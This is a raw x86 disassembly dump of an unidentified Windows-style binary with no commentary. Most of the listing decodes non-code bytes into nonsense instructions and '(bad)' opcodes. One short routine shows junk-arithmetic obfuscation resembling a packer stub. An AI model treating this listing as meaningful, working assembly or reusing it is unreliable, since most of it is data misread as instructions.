  40991b:	hlt    
  40991c:	arpl   cx,dx
  40991e:	push   ds
  40991f:	jge    0x40995e
  409921:	mov    cs,edi
  409923:	aam    0x6c
  409925:	test   eax,0x6be4be9
  40992a:	jmp    0x915e:0x13552f15
  409931:	jp     0x4098cf
  409933:	shr    DWORD PTR [eax],1
  409935:	stos   DWORD PTR es:[edi],eax
  409936:	(bad)  [ecx+eiz*4]
  409939:	or     esi,DWORD PTR [esi]
  40993b:	push   edi
  40993c:	jmp    0x1363:0x894665ca
  409943:	leave  
  409944:	inc    edi
  409945:	fistp  DWORD PTR [esi+0xe18d3da]
  40994b:	mov    cl,0xfb
  40994d:	fwait
  40994e:	mov    ebp,0x2f7f0a38
  409953:	xor    al,0xfe
  409955:	pusha  
  409956:	push   ebp
  409957:	xor    DWORD PTR fs:0xddeccc0f,0xffffffed
  40995f:	add    BYTE PTR [esp+ebx*2-0x39734525],0xe7
  409967:	jge    0x4098f4
  409969:	jecxz  0x409979
  40996b:	mov    esp,0x5b3502fb
  409970:	ds jp  0x40993d
  409973:	and    BYTE PTR gs:[edi],0x1f
  409977:	dec    ebx
  409978:	aam    0xac
  40997a:	imul   edi,DWORD PTR [esi-0x2e67be4f],0x4d59e094
  409984:	stc    
  409985:	pop    ss
  409986:	fiadd  DWORD PTR [esi]
  409988:	xor    al,0xb3
  40998a:	dec    edx
  40998b:	xor    BYTE PTR [ebx],cl
  40998d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40998e:	adc    al,0xad
  409990:	push   ebp
  409991:	mov    dl,0x13
  409993:	sysret 
  409995:	jl     0x409933
  409997:	push   esi
  409998:	ins    DWORD PTR es:[edi],dx
  409999:	mov    dh,0xac
  40999b:	inc    esp
  40999c:	loop   0x409967
  40999e:	ret    
  40999f:	push   ebx
  4099a0:	dec    ebp
  4099a1:	cmp    esi,ebx
  4099a3:	sahf   
  4099a4:	sahf   
  4099a5:	pop    ecx
  4099a6:	dec    ebp
  4099a7:	xor    al,0x77
  4099a9:	add    eax,0x17a5eb1d
  4099ae:	lock out dx,eax
  4099b0:	push   eax
  4099b1:	ins    DWORD PTR es:[edi],dx
  4099b2:	out    dx,al
  4099b3:	push   esi
  4099b4:	or     ch,BYTE PTR [esi]
  4099b6:	xchg   DWORD PTR [edi],ebp
  4099b8:	retf   
  4099b9:	jecxz  0x4099e7
  4099bb:	test   DWORD PTR ss:[ecx],edx
  4099be:	ins    DWORD PTR es:[edi],dx
  4099bf:	les    edx,FWORD PTR [esi]
  4099c1:	add    DWORD PTR [ecx],0x5b5e5f08
  4099c7:	leave  
  4099c8:	ret    
  4099c9:	push   ebp
  4099ca:	mov    ebp,esp
  4099cc:	sub    esp,0x44
  4099cf:	push   edi
  4099d0:	sub    DWORD PTR ds:0x42fd8a,0x50c
  4099da:	mov    eax,DWORD PTR [ebp+0xc]
  4099dd:	sbb    DWORD PTR ds:0x42e11c,edx
  4099e3:	mov    DWORD PTR [ebp-0x10],eax
  4099e6:	mov    eax,ds:0x42e297
  4099eb:	mov    edi,DWORD PTR ds:0x42e2a7
  4099f1:	sub    eax,edi
  4099f3:	imul   eax,DWORD PTR [eax+edi*1]
  4099f7:	mov    eax,DWORD PTR [ebp+0x8]
  4099fa:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  409a01:	neg    edx
  409a03:	mov    DWORD PTR [ebp-0x20],0xf89c8530
  409a0a:	mov    edi,DWORD PTR ds:0x42e79c
  409a10:	mov    edi,DWORD PTR [edi]
  409a12:	or     DWORD PTR ds:0x42e124,edi
  409a18:	mov    edx,DWORD PTR [ebp+0x8]
  409a1b:	add    edi,0x5c8e
  409a21:	mov    DWORD PTR [ebp-0x40],eax
  409a24:	adc    DWORD PTR ds:0x42fcf9,0x342b
  409a2e:	mov    eax,0x7510855
  409a33:	xor    edi,ecx
  409a35:	xor    edx,eax
  409a37:	mov    edi,DWORD PTR ds:0x42e11c
  409a3d:	sbb    DWORD PTR ds:0x42e6eb,edi
  409a43:	mov    ecx,0x32729c
  409a48:	jmp    0x409e06
  409a4d:	arpl   WORD PTR [edx-0x6f],si
  409a50:	cmc    
  409a51:	xchg   ecx,eax
  409a52:	cmc    
  409a53:	arpl   WORD PTR [edx-0x1f],si
  409a56:	pop    ebp
  409a57:	das    
  409a58:	test   ebp,0x87d11c24
  409a5e:	in     al,dx
  409a5f:	jo     0x409ad1
  409a61:	lahf   
  409a62:	jge    0x409ad4
  409a64:	jo     0x409a6d
  409a66:	mov    eax,ds:0xfff4a577
  409a6b:	call   0xbf07:0x6c7a8a65
  409a72:	fs ja  0x409a03
  409a75:	pushf  
  409a76:	jbe    0x409aa1
  409a78:	icebp  
  409a79:	xchg   ebp,eax
  409a7a:	fistp  DWORD PTR [edx]
  409a7c:	or     ah,BYTE PTR [ebx]
  409a7e:	or     al,0x3e
  409a80:	pop    ecx
  409a81:	add    ebx,ebp
  409a83:	xlat   BYTE PTR ds:[ebx]
  409a84:	inc    ebp
  409a85:	mov    esi,0x94c4dd68
  409a8a:	push   ds
  409a8b:	daa    
  409a8c:	mov    dh,BYTE PTR [eax+0x13e7c0b1]
  409a92:	(bad)  
  409a93:	pop    ecx
  409a94:	push   edi
  409a95:	jecxz  0x409a19
  409a97:	inc    edi
  409a98:	mov    bh,0x5f
  409a9a:	adc    BYTE PTR [edx+0x50],al
  409a9d:	fcom   DWORD PTR [esi-0x44]
  409aa0:	add    DWORD PTR [ebx-0x50],ebp
  409aa3:	push   ebx
  409aa4:	repnz mov eax,ds:0x1f03b4e2
  409aaa:	ret    
  409aab:	xor    al,0x0
  409aad:	mov    ecx,0xf23ba003
  409ab2:	push   cs
  409ab3:	ret    0x8aa2
  409ab6:	hlt    
  409ab7:	sub    edx,ecx
  409ab9:	or     al,0x27
  409abb:	jecxz  0x409a60
  409abd:	sbb    dh,al
  409abf:	add    al,0xea
  409ac1:	and    eax,0x335a5292
  409ac6:	sbb    BYTE PTR [ecx],cl
  409ac8:	jmp    0x409b04
  409aca:	or     ebp,DWORD PTR [edi+0x7cdd65d5]
  409ad0:	jnp    0x409a9b
  409ad2:	ror    DWORD PTR [eax-0x2],0x37
  409ad6:	inc    DWORD PTR [edi+0xb]
  409ad9:	ret    
  409ada:	out    dx,al
  409adb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409adc:	xchg   ebx,eax
  409add:	leave  
  409ade:	jns    0x409b11
  409ae0:	retw   0x1413
  409ae4:	xchg   DWORD PTR [edx-0x4e985428],esp
  409aea:	shl    DWORD PTR [edi-0x38],cl
  409aed:	(bad)  
  409aee:	mov    esp,0x191e2ec6
  409af3:	mov    al,BYTE PTR [ecx-0x3e8f4aa6]
  409af9:	xor    DWORD PTR [esp+edx*8-0x3e19959c],0x7e
  409b01:	sbb    DWORD PTR [edi+ecx*4-0x2a585857],eax
  409b08:	gs in  al,0x47
  409b0b:	xor    ch,BYTE PTR [eax+0x12]
  409b0e:	mov    esi,0x743532f5
  409b13:	xor    eax,0xf267838
  409b18:	enter  0xf24b,0x87
  409b1c:	cmc    
  409b1d:	in     eax,0x3f
  409b1f:	jnp    0x409b91
  409b21:	mov    ebp,0xcb29d365
  409b26:	push   edi
  409b27:	xor    edx,ebx
  409b29:	xchg   esp,eax
  409b2a:	mov    eax,0x3bf55900
  409b2f:	or     dl,BYTE PTR [ebp+0x75]
  409b32:	sbb    edx,DWORD PTR [ecx]
  409b34:	pop    eax
  409b35:	or     cl,BYTE PTR [ebx]
  409b37:	nop
  409b38:	test   BYTE PTR [eax-0x47],ah
  409b3b:	icebp  
  409b3c:	fdivr  QWORD PTR fs:[edx+0x36]
  409b40:	or     al,0x8d
  409b42:	xchg   edi,eax
  409b43:	scas   al,BYTE PTR es:[edi]
  409b44:	mov    edi,0xfb771f68
  409b49:	sbb    edx,edi
  409b4b:	out    0x2,al
  409b4d:	push   esp
  409b4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b4f:	leave  
  409b50:	and    ebx,ebx
  409b52:	js     0x409b86
  409b54:	(bad)  
  409b55:	jmp    0x409ba5
  409b57:	idiv   al
  409b59:	mov    ecx,0xe9e9168c
  409b5e:	adc    BYTE PTR [ecx],dh
  409b60:	adc    al,0x9
  409b62:	(bad)  
  409b64:	fxam   
  409b66:	and    BYTE PTR [esi-0x80],0xe
  409b6a:	pushf  
  409b6b:	jmp    0xaa37:0x73507ca3
  409b72:	xor    al,0x53
  409b74:	ja     0x409b69
  409b76:	sbb    BYTE PTR [edi+0x32a7d208],dh
  409b7c:	mov    WORD PTR [esi],cs
  409b7e:	mov    ecx,0xfc51fd40
  409b83:	xchg   ecx,esi
  409b85:	and    al,0x75
  409b87:	pop    ebp
  409b88:	and    DWORD PTR [eax-0x523d6da0],ebx
  409b8e:	(bad)  
  409b8f:	iret   
  409b90:	repz inc esi
  409b92:	add    BYTE PTR [ecx+0x4d0e326c],cl
  409b98:	aad    0xb9
  409b9a:	sub    BYTE PTR [edi-0x3a],ah
  409b9d:	mov    ds:0x3caf1c7f,al
  409ba2:	daa    
  409ba3:	inc    ebp
  409ba4:	xor    BYTE PTR [ecx],ch
  409ba6:	push   eax
  409ba7:	ret    0xf1b
  409baa:	sub    BYTE PTR [esi+0x4b111a19],dl
  409bb0:	jae    0x409b38
  409bb2:	imul   eax,esp,0xedc875bd
  409bb8:	shl    DWORD PTR [eax+0x4f],cl
  409bbb:	xlat   BYTE PTR ds:[ebx]
  409bbc:	(bad)  
  409bbd:	sbb    DWORD PTR [ecx+0x54],edi
  409bc0:	shl    DWORD PTR [ebx+0x135c209],cl
  409bc6:	mov    si,0xc344
  409bca:	shl    BYTE PTR [ebx+ecx*2+0x43683ada],0x48
  409bd2:	daa    
  409bd3:	cmp    edx,DWORD PTR [ecx]
  409bd5:	mov    edi,0xae45731
  409bda:	aaa    
  409bdb:	mov    esp,0x54cc243e
  409be0:	push   0xe7bc0bce
  409be5:	push   ebx
  409be6:	or     al,0x5f
  409be8:	xchg   BYTE PTR [eax+0x7acd71be],ah
  409bee:	outs   dx,BYTE PTR ds:[esi]
  409bef:	mov    ch,BYTE PTR [esi-0x11250554]
  409bf5:	test   DWORD PTR [edx+0x5982ba99],eax
  409bfb:	cs (bad) 
  409bfd:	dec    esp
  409bfe:	outs   dx,BYTE PTR ds:[esi]
  409bff:	cmp    edi,DWORD PTR [ebx-0x4f]
  409c02:	dec    ecx
  409c03:	(bad)  [ecx+0x31b75c8c]
  409c09:	xchg   DWORD PTR [edi+0x46],eax
  409c0c:	inc    edx
  409c0d:	cmp    ah,BYTE PTR [esi+esi*8-0x7f052114]
  409c14:	lods   eax,DWORD PTR ds:[esi]
  409c15:	lea    ebp,[esi+0x69]
  409c18:	(bad)  
  409c19:	or     eax,0x87f251c2
  409c1e:	inc    edx
  409c1f:	add    BYTE PTR [esi+0x6c],dl
  409c22:	jl     0x409bcd
  409c24:	xchg   edi,eax
  409c25:	mov    edx,0x71096881
  409c2a:	loopne 0x409bba
  409c2c:	mov    ebx,0xe3d0ff96
  409c31:	cmp    DWORD PTR [edx-0x56],eax
  409c34:	shr    BYTE PTR [eax],0xee
  409c37:	xor    BYTE PTR [esi+0x41],bl
  409c3a:	jb     0x409c48
  409c3c:	test   BYTE PTR [esi-0x3146b23a],0x9a
  409c43:	mov    BYTE PTR [eax+0x4d],al
  409c46:	xlat   BYTE PTR ds:[ebx]
  409c47:	int    0x87
  409c49:	jne    0x409c0d
  409c4b:	(bad)  
  409c4d:	xor    dh,BYTE PTR [eax*4-0x14a3e520]
  409c54:	js     0x409bf7
  409c56:	rcr    BYTE PTR [edi-0x11],1
  409c59:	addr16 out 0xa8,al
  409c5c:	hlt    
  409c5d:	mov    dh,0xba
  409c5f:	sub    DWORD PTR [ecx-0x46],esp
  409c62:	ror    BYTE PTR [edi],cl
  409c64:	push   edx
  409c65:	mov    ds:0x976e7920,eax
  409c6a:	xor    esi,DWORD PTR [esi-0x1f910c8f]
  409c70:	inc    eax
  409c71:	mov    eax,ds:0x82c9744
  409c76:	pusha  
  409c77:	mov    ecx,ecx
  409c79:	not    DWORD PTR [ecx-0x55]
  409c7c:	push   ebx
  409c7d:	mov    ebp,0x973dc935
  409c82:	in     eax,0xa5
  409c84:	scas   eax,DWORD PTR es:[edi]
  409c85:	(bad)  
  409c86:	jl     0x409c6d
  409c88:	or     al,BYTE PTR ds:0xe0b4fa
  409c8e:	in     eax,0xe0
  409c90:	sahf   
  409c91:	icebp  
  409c92:	xchg   ecx,eax
  409c93:	pop    ss
  409c94:	pop    esi
  409c95:	popf   
  409c96:	jp     0x409c53
  409c98:	aad    0xed
  409c9a:	mov    ah,0x51
  409c9c:	sbb    eax,0x822a7103
  409ca1:	dec    ebp
  409ca2:	shl    DWORD PTR [ebx+0x77],1
  409ca5:	cdq    
  409ca6:	scas   al,BYTE PTR es:[edi]
  409ca7:	dec    esp
  409ca8:	dec    ecx
  409ca9:	cs stc 
  409cab:	in     eax,dx
  409cac:	add    DWORD PTR [edx],ebx
  409cae:	imul   BYTE PTR [eax]
  409cb0:	aad    0x15
  409cb2:	dec    edx
  409cb3:	and    BYTE PTR [edx+0x75945148],al
  409cb9:	sub    eax,DWORD PTR [ecx+0x6926fb56]
  409cbf:	xor    al,0x15
  409cc1:	fimul  WORD PTR [eax+edi*8]
  409cc4:	lahf   
  409cc5:	sbb    DWORD PTR [ebp-0x2a37859f],esp
  409ccb:	inc    esp
  409ccc:	or     BYTE PTR [ebx-0x79bc1bf0],cl
  409cd2:	pushf  
  409cd3:	mov    BYTE PTR [esi+eiz*8-0x2],dl
  409cd7:	dec    esi
  409cd8:	pop    edi
  409cd9:	add    eax,0xc3d8543f
  409cde:	and    al,ch
  409ce0:	ret    
  409ce1:	jp     0x409d4e
  409ce3:	pop    ecx
  409ce4:	jae    0x409cd8
  409ce6:	jmp    0x409cb2
  409ce8:	ja     0x409d69
  409cea:	and    DWORD PTR [ecx-0x35c910c],ebx
  409cf0:	outs   dx,DWORD PTR ds:[esi]
  409cf1:	loope  0x409d1c
  409cf3:	test   BYTE PTR [eax],0xef
  409cf6:	or     dl,dl
  409cf8:	loopne 0x409d06
  409cfa:	push   0x1778ccc5
  409cff:	push   esi
  409d00:	adc    eax,DWORD PTR [edi+0x73c2e06a]
  409d06:	xor    BYTE PTR [edx+0x75],0x45
  409d0a:	xor    ch,BYTE PTR [eax]
  409d0c:	lea    edx,[esi+edx*2]
  409d0f:	lock into 
  409d11:	mov    ds:0xcd71e21a,eax
  409d16:	in     eax,0x46
  409d18:	clc    
  409d19:	ss fs pop ebx
  409d1c:	(bad)  
  409d1d:	call   FWORD PTR [esi]
  409d1f:	lock dec edx
  409d21:	or     ebx,0xfffffff7
  409d24:	adc    eax,0x402e5e9a
  409d29:	sbb    cl,0xae
  409d2c:	push   ecx
  409d2d:	and    bh,bl
  409d2f:	or     eax,edi
  409d31:	loope  0x409d84
  409d33:	int3   
  409d34:	inc    DWORD PTR [ebx-0x5]
  409d37:	inc    ecx
  409d38:	ja     0x409d0a
  409d3a:	xor    eax,0x29b3c821
  409d3f:	pop    ebx
  409d40:	sub    BYTE PTR [edx],dl
  409d42:	lods   al,BYTE PTR ds:[esi]
  409d43:	jle    0x409d9c
  409d45:	call   0x1828:0x7cda980c
  409d4c:	adc    al,0x87
  409d4e:	inc    edx
  409d4f:	popf   
  409d50:	ror    DWORD PTR [edi-0x4c],cl
  409d53:	dec    eax
  409d54:	mov    eax,DWORD PTR [edx-0x60]
  409d57:	idiv   BYTE PTR [ebx-0x6ac588e1]
  409d5d:	inc    edi
  409d5e:	bound  ebx,QWORD PTR [ebx+0x4c]
  409d61:	loopne 0x409d10
  409d63:	popf   
  409d64:	inc    ebp
  409d65:	sahf   
  409d66:	pop    esi
  409d67:	pop    ebx
  409d68:	dec    edi
  409d69:	sub    eax,0xfff2ef55
  409d6e:	push   edi
  409d6f:	add    edi,DWORD PTR [edi+esi*8-0x16]
  409d73:	xchg   eax,ebx
  409d75:	test   eax,0xa6a95f8f
  409d7a:	pop    esp
  409d7b:	mov    ebx,0x5f775e33
  409d80:	jno    0x409df5
  409d82:	jp     0x409dff
  409d84:	fucomip st,st(0)
  409d86:	mov    esi,0xa1f865af
  409d8b:	cmp    DWORD PTR [edx],0xffffffee
  409d8e:	mov    ch,0x27
  409d90:	call   FWORD PTR [edi]
  409d92:	sbb    eax,0x9f708ef3
  409d97:	inc    esp
  409d98:	dec    BYTE PTR [edx]
  409d9a:	out    dx,eax
  409d9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d9c:	frstor [esi]
  409d9e:	jmp    0x409d8d
  409da0:	sub    BYTE PTR [eax+0x4c64a481],bl
  409da6:	jmp    0x8540:0xcaa8f664
  409dad:	stos   DWORD PTR es:[edi],eax
  409dae:	loope  0x409e0b
  409db0:	mov    al,0xf4
  409db2:	(bad)  
  409db3:	adc    eax,0x7de205a5
  409db8:	in     eax,0xb
  409dba:	push   cs
  409dbb:	push   ecx
  409dbc:	pop    ebp
  409dbd:	mov    BYTE PTR [ecx+ecx*2-0x4],dh
  409dc1:	addr16 icebp 
  409dc3:	sbb    al,0xe2
  409dc5:	push   esp
  409dc6:	sub    al,0x17
  409dc8:	shl    DWORD PTR [edx],1
  409dca:	leave  
  409dcb:	bound  edx,QWORD PTR [esi+0x62cb57c0]
  409dd1:	xchg   edi,eax
  409dd2:	mov    ch,0xf6
  409dd4:	dec    esi
  409dd5:	adc    edi,DWORD PTR [esp+eiz*4+0x32]
  409dd9:	pop    ecx
  409dda:	sub    BYTE PTR [edx-0x4],bl
  409ddd:	iret   
  409dde:	lock retf 
  409de0:	cmp    eax,0xf89e7567
  409de5:	inc    ebx
  409de6:	xor    dh,BYTE PTR [edx-0x6a]
  409de9:	popa   
  409dea:	cmp    eax,0xb755b4de
  409def:	cmp    esp,0xffffffe8
  409df2:	(bad)  
  409df3:	arpl   dx,ax
  409df5:	and    eax,0x199af8f2
  409dfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dfb:	ret    
  409dfc:	and    ecx,esi
  409dfe:	add    DWORD PTR [ecx+0x2c],esp
  409e01:	or     DWORD PTR [ecx-0x77],ecx
  409e04:	add    BYTE PTR [edi+0xd31d103],0x8a
  409e0b:	std    
  409e0c:	inc    edx
  409e0d:	add    BYTE PTR [ecx+0x558bf855],cl
  409e13:	or     BYTE PTR [ebx],ah
  409e15:	cmp    eax,0x42fcf9
  409e1a:	xor    edx,eax
  409e1c:	adc    edi,DWORD PTR ds:0x42e124
  409e22:	add    edx,ecx
  409e24:	mov    DWORD PTR ds:0x42fd82,0x18
  409e2e:	cmp    DWORD PTR ds:0x42fd82,0x0
  409e35:	je     0x409e63
  409e3b:	cmp    DWORD PTR ds:0x42fd82,0x1a
  409e42:	jne    0x409e51
  409e48:	push   DWORD PTR [ebp-0xc]
  409e4b:	call   DWORD PTR ds:0x42e2e3
  409e51:	mov    edi,DWORD PTR ds:0x42fd82
  409e57:	dec    edi
  409e58:	mov    DWORD PTR ds:0x42fd82,edi
  409e5e:	jmp    0x409e2e
  409e63:	mov    DWORD PTR [ebp+0xc],edx
  409e66:	adc    DWORD PTR ds:0x42e703,0x3e25
  409e70:	jmp    0x40a22e
  409e75:	xlat   BYTE PTR ds:[ebx]
  409e76:	mov    edi,0x699269fa
  409e7b:	mul    DWORD PTR [ecx-0x79]
  409e7e:	mov    dh,0xc4
  409e80:	(bad)  
  409e81:	cmp    dl,BYTE PTR [ebp-0x17d98f7d]
  409e87:	jo     0x409ef9
  409e89:	lahf   
  409e8a:	jge    0x409efc
  409e8c:	jo     0x409ea8
  409e8e:	xchg   DWORD PTR [ebp-0x28f5492b],esi
  409e94:	fadd   QWORD PTR [ebx-0x5a]
  409e97:	mov    esi,0x8a61196f
  409e9c:	jge    0x409efb
  409e9e:	imul   esi,DWORD PTR [eax-0x298f2e6c],0xffffffbd
  409ea5:	mov    bl,0x63
  409ea7:	xor    BYTE PTR ds:0x567d21cf,ch
  409ead:	sbb    al,0x54
  409eaf:	sti    
  409eb0:	(bad)  
  409eb1:	fld    DWORD PTR [ebp-0x23]
  409eb4:	not    DWORD PTR [ecx+0x6]
  409eb7:	sub    BYTE PTR [edi+0x6a],ah
  409eba:	mul    eax
  409ebc:	aas    
  409ebd:	mov    ebx,0xc85f0a55
  409ec2:	pop    ds
  409ec3:	push   0xd9cc2fdb
  409ec8:	pushf  
  409ec9:	jbe    0x409e7e
  409ecb:	sbb    bl,dl
  409ecd:	sbb    BYTE PTR [ebp+0x538af1e],ah
  409ed3:	dec    ebp
  409ed4:	xor    esp,ebx
  409ed6:	add    eax,0xe005714b
  409edb:	cmp    eax,0xfb102308
  409ee0:	stc    
  409ee1:	std    
  409ee2:	dec    esp
  409ee3:	fstp   QWORD PTR [ecx+esi*8]
  409ee6:	shl    BYTE PTR [ebx+ebx*8-0xa],0x5e
  409eeb:	loope  0x409f08
  409eed:	push   esi
  409eee:	or     eax,0xa1581d69
  409ef3:	jo     0x409ea7
  409ef5:	into   
  409ef6:	jae    0x409ed7
  409ef8:	and    bl,dh
  409efa:	into   
  409efb:	push   ecx
  409efc:	jle    0x409f3e
  409efe:	scas   al,BYTE PTR es:[edi]
  409eff:	aaa    
  409f00:	jmp    0x10cef137
  409f05:	add    cl,0x9a
  409f08:	out    0xca,al
  409f0a:	pop    ebp
  409f0b:	adc    al,0x3d
  409f0d:	jbe    0x409eb6
  409f0f:	xchg   esp,eax
  409f10:	and    DWORD PTR [esi+0x57],edx
  409f13:	inc    ebp
  409f14:	cmp    DWORD PTR [ebp-0x3d5d4f20],eax
  409f1a:	xor    bh,BYTE PTR [esi]
  409f1c:	pop    ecx
  409f1d:	mov    ecx,0x7cb89e73
  409f22:	mov    ebp,0x2bac6a3c
  409f27:	aam    0xd8
  409f29:	aas    
  409f2a:	xor    al,BYTE PTR [edi]
  409f2c:	adc    DWORD PTR [edi-0x7a8c57e4],ebp
  409f32:	out    dx,al
  409f33:	enter  0x515d,0xd4
  409f37:	in     eax,0x53
  409f39:	and    al,0xd7
  409f3b:	(bad)  
  409f3c:	lock or BYTE PTR [ebp+0x12f81593],0x7a
  409f44:	fistp  DWORD PTR [esi-0x44]
  409f47:	mov    edi,0xcf6ba658
  409f4c:	(bad)  
  409f4d:	and    DWORD PTR [eax-0x6],esi
  409f50:	ficomp WORD PTR [di-0x1262]
  409f55:	test   BYTE PTR [eax-0x6facfe13],ah
  409f5b:	int3   
  409f5c:	aam    0xe6
  409f5e:	cmp    ebp,DWORD PTR [ebp-0x3492e4c0]
  409f64:	and    al,0xe4
  409f66:	hlt    
  409f67:	test   ebx,esp
  409f69:	retf   0x348d
  409f6c:	addr16 mov eax,ds:0x5abe
  409f70:	mov    ss,WORD PTR [edx+ebp*1]
  409f73:	cwde   
  409f74:	mov    esi,0x13fd441f
  409f79:	inc    ecx
  409f7a:	mov    al,ds:0xed062496
  409f7f:	xchg   DWORD PTR [edi-0x1573598f],ecx
  409f85:	in     eax,0x9f
  409f87:	inc    ebx
  409f88:	adc    DWORD PTR [edi-0x73],0x4f0958a1
  409f8f:	dec    ebx
  409f90:	inc    eax
  409f91:	or     BYTE PTR [edi],ch
  409f93:	ret    
  409f94:	iret   
  409f95:	cmp    DWORD PTR [ecx],ebp
  409f97:	stc    
  409f98:	jbe    0x409faf
  409f9a:	neg    eax
  409f9c:	push   cs
  409f9d:	cmp    dl,BYTE PTR [esi+ecx*2]
  409fa0:	mov    al,ds:0xe9fa5bf1
  409fa5:	out    dx,eax
  409fa6:	or     eax,0x80fc5a80
  409fab:	pop    esp
  409fac:	and    BYTE PTR [eax-0x47],dh
  409faf:	add    eax,0xb1c3c2f
  409fb4:	mov    ch,0x5b
  409fb6:	jmp    0x409fbb
  409fb8:	sbb    BYTE PTR [ebp+0x19544ed3],dl
  409fbe:	and    al,0xfe
  409fc0:	aad    0x32
  409fc2:	arpl   WORD PTR ss:[esi+0x37],cx
  409fc6:	mov    ebp,0xa1e826f6
  409fcb:	aas    
  409fcc:	jmp    0x409fd8
  409fce:	or     ebp,DWORD PTR [eax-0x7ac59914]
  409fd4:	add    BYTE PTR [ebp-0x108650bb],bh
  409fda:	hlt    
  409fdb:	xor    al,0x9d
  409fdd:	sbb    eax,edi
  409fdf:	call   0xc003b3f6
  409fe4:	push   eax
  409fe5:	sub    dl,dl
  409fe7:	lock imul esi,DWORD PTR [eax+0x7c140af8],0xffffffff
  409fef:	ins    BYTE PTR es:[edi],dx
  409ff0:	cmp    al,0x52
  409ff2:	nop
  409ff3:	dec    edi
  409ff4:	jno    0x409f82
  409ff6:	inc    eax
  409ff7:	movsx  esp,BYTE PTR [eax+0x45e4d6bb]
  409ffe:	(bad)  
  40a000:	or     BYTE PTR [edi+0x64],ch
  40a003:	xchg   esi,eax
  40a004:	adc    al,0xe5
  40a006:	pop    ds
  40a007:	call   0x7e438c33
  40a00c:	adc    DWORD PTR [eax+0x24],ebp
  40a00f:	arpl   dx,si
  40a011:	hlt    
  40a012:	mov    ds:0xa3072d1c,al
  40a017:	out    0x6c,eax
  40a019:	retf   
  40a01a:	pop    ebp
  40a01b:	nop
  40a01c:	rcr    BYTE PTR ds:0x874d1e71,cl
  40a022:	pop    ebx
  40a023:	sbb    eax,0x8fdf3025
  40a028:	jbe    0x40a072
  40a02a:	push   0x2e
  40a02c:	je     0x409ff8
  40a02e:	cmc    
  40a02f:	and    DWORD PTR [edi+0xd],0xffffffd3
  40a033:	mov    bl,0x5e
  40a035:	mov    bl,BYTE PTR [ebp+edi*4-0x4a]
  40a039:	popf   
  40a03a:	loope  0x40a06d
  40a03c:	das    
  40a03d:	mov    al,0x35
  40a03f:	add    BYTE PTR [esi+0x20],bl
  40a042:	in     eax,dx
  40a043:	jmp    DWORD PTR [ecx]
  40a045:	stos   BYTE PTR es:[edi],al
  40a046:	js     0x40a099
  40a048:	in     eax,dx
  40a049:	pop    es
  40a04a:	or     eax,esp
  40a04c:	and    eax,edx
  40a04e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a04f:	sar    BYTE PTR [esi-0x1c9362d],cl
  40a055:	xchg   esp,eax
  40a056:	repnz xchg sp,ax
  40a059:	jl     0x409ff7
  40a05b:	pop    ecx
  40a05c:	inc    ecx
  40a05d:	call   0x46e79fe7
  40a062:	cmp    ebp,edi
  40a064:	cmp    bh,BYTE PTR [ebp+0x45]
  40a067:	sub    ecx,esp
  40a069:	mov    dl,0xc8
  40a06b:	ret    0xa690
  40a06e:	xor    DWORD PTR [ebp-0x16c14103],eax
  40a074:	iret   
  40a075:	mov    edi,0x7d2072bb
  40a07a:	mov    ebx,0xe048ae1c
  40a07f:	cmp    DWORD PTR [ebx+ebx*1-0x582b8e0e],ebx
  40a086:	jb     0x40a078
  40a088:	pop    esi
  40a089:	call   0xb7116145
  40a08e:	iret   
  40a08f:	or     eax,0x986944d6
  40a094:	add    esp,DWORD PTR [esi+0x5e256580]
  40a09a:	clc    
  40a09b:	aad    0x7d
  40a09d:	rcr    DWORD PTR [ebp-0x429d0d3],1
  40a0a3:	sbb    ch,BYTE PTR [eax]
  40a0a5:	(bad)  
  40a0a6:	mov    bl,0xb4
  40a0a8:	cmp    eax,0xa7895f09
  40a0ad:	ins    DWORD PTR es:[edi],dx
  40a0ae:	adc    edi,edx
  40a0b0:	sub    edx,DWORD PTR [ecx+0x34]
  40a0b3:	mov    ds:0xb7ef9e30,eax
  40a0b8:	pop    esp
  40a0b9:	in     al,0xde
  40a0bb:	dec    ebp
  40a0bc:	out    0xd8,eax
  40a0be:	push   ebp
  40a0bf:	dec    ebp
  40a0c0:	dec    edx
  40a0c1:	cdq    
  40a0c2:	xlat   BYTE PTR ds:[ebx]
  40a0c3:	pop    edx
  40a0c4:	and    eax,0x8b320050
  40a0c9:	and    edx,DWORD PTR ds:0x4bf2653c
  40a0cf:	shl    ah,cl
  40a0d1:	or     al,0xfe
  40a0d3:	jmp    FWORD PTR [eax+0x5b]
  40a0d6:	inc    ebx
  40a0d7:	clc    
  40a0d8:	push   ecx
  40a0d9:	sub    BYTE PTR [eax+0x6e],0x38
  40a0dd:	rcr    DWORD PTR [edi],1
  40a0df:	sar    BYTE PTR [edx+0x47],cl
  40a0e2:	sub    al,0xef
  40a0e4:	fist   DWORD PTR [ebp+0x53bc953c]
  40a0ea:	stc    
  40a0eb:	sub    edi,DWORD PTR [ecx+edi*2]
  40a0ee:	jmp    0x8272:0x8c58cdbc
  40a0f5:	mov    ds:0xcce7c240,eax
  40a0fa:	retf   
  40a0fb:	fsubr  QWORD PTR [ecx-0x445778b0]
  40a101:	stos   BYTE PTR es:[edi],al
  40a102:	mov    ch,0x89
  40a104:	fidivr WORD PTR [esi+0x3bcaacd5]
  40a10a:	mov    bh,0x4f
  40a10c:	stc    
  40a10d:	mov    cl,0x38
  40a10f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a110:	pushf  
  40a111:	mov    cl,0x7d
  40a113:	mov    esp,0x998baae7
  40a118:	loop   0x40a11f
  40a11a:	ret    0xdf27
  40a11d:	inc    edx
  40a11e:	(bad)  
  40a120:	push   ecx
  40a121:	push   ebp
  40a122:	es hlt 
  40a124:	push   ecx
  40a125:	or     DWORD PTR [ecx+0x69b47fe1],esp
  40a12b:	outs   dx,BYTE PTR ds:[esi]
  40a12c:	xchg   DWORD PTR [edx-0x38],ecx
  40a12f:	aas    
  40a130:	adc    ecx,DWORD PTR [ecx]
  40a132:	and    DWORD PTR [esi],edi
  40a134:	fiadd  WORD PTR [esi+0x1e7480c0]
  40a13a:	in     eax,0xc0
  40a13c:	shl    BYTE PTR [esp+ebp*1+0x44],cl
  40a140:	int3   
